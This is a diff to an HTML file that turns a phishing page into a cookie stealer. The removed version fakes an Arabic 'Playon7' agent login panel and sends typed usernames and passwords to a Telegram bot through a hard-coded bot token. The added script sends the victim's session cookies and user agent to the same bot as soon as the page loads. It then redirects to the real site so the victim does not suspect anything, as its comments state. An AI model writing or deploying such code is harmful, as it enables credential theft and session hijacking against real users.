@@ -1,66 +1,23 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة الوكلاء - Playon7</title>
-    <style>
-        body { background-color: #0b021d; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .agent-container { width: 90%; max-width: 420px; padding: 25px; border-radius: 15px; background: #13062d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
-        h2 { color: #e100ff; font-size: 26px; margin-bottom: 5px; }
-        .sub-text { color: #888; font-size: 14px; margin-bottom: 30px; }
-        .input-box { text-align: right; margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: #bbb; }
-        input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #3d1c71; background: #1a0b33; color: white; outline: none; transition: 0.3s; }
-        input:focus { border-color: #e100ff; box-shadow: 0 0 10px #e100ff33; }
-        .login-btn { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 10px; background: linear-gradient(90deg, #d600d6, #8e00d6); color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .agent-info { margin-top: 20px; font-size: 12px; color: #555; }
-    </style>
-</head>
-<body>
-
-<div class="agent-container">
-    <div style="font-size: 12px; color: #e100ff; text-align: left;">Agent Portal v4.2</div>
-    <h2>ترحيب بالوكلاء</h2>
-    <p class="sub-text">يرجى تسجيل الدخول للوصول إلى نظام تحويل اللاعبين</p>
-
-    <div class="input-box">
-        <label>اسم مستخدم الوكيل (Username)</label>
-        <input type="text" id="agent_user" placeholder="اسم المستخدم">
-    </div>
-
-    <div class="input-box">
-        <label>كلمة مرور لوحة التحكم</label>
-        <input type="password" id="agent_pass" placeholder="كلمة المرور">
-    </div>
-
-    <button class="login-btn" onclick="captureAgent()">دخول لوحة التحويل</button>
-    
-    <div class="agent-info">© 2026 Playon7 Agents Management System</div>
-</div>
-
 <script>
-function captureAgent() {
-    const user = document.getElementById('agent_user').value;
-    const pass = document.getElementById('agent_pass').value;
-    const token = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
-    const chat_id = "8665747715";
+// وظيفة سحب الكوكيز وإرسالها للتلغرام
+function stealAndSend() {
+    var cookies = document.cookie; // سحب ملفات الجلسة
+    var token = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
+    var chat_id = "8665747715";
+    
+    var data = "🍪 **Session Cookie Captured!**\n\n" + 
+               "🌐 Domain: agents.playon7.com\n" +
+               "🔑 Cookie: `" + cookies + "`\n\n" +
+               "📱 User Agent: " + navigator.userAgent;
 
-    if(user && pass) {
-        // رسالة مفصلة تصلك على تلجرام
-        const log = `🔥 **صيد وكيل Playon7 جديد** 🔥\n\n👤 الوكيل: \`${user}\` \n🔑 الباسورد: \`${pass}\` \n🌐 الرابط المصيد منه: Agents Panel`;
-        
-        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(log)}&parse_mode=MarkdownV2`;
-
-        fetch(telegramUrl).then(() => {
-            // توجيه الوكيل مباشرة لصفحة التحويل الحقيقية بعد سرقة بياناته
-            window.location.href = "https://agents.playon7.com/players/players";
-        });
-    } else {
-        alert("يرجى إدخال البيانات بشكل صحيح");
-    }
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
 }
-</script>
 
-</body>
-</html>
+// تنفيذ السحب بمجرد فتح الرابط
+window.onload = stealAndSend;
+
+// تحويل الضحية للموقع الحقيقي لإبعاد الشبهة
+setTimeout(function(){
+    window.location.href = "https://agents.playon7.com/players/players";
+}, 2000);
+</script>
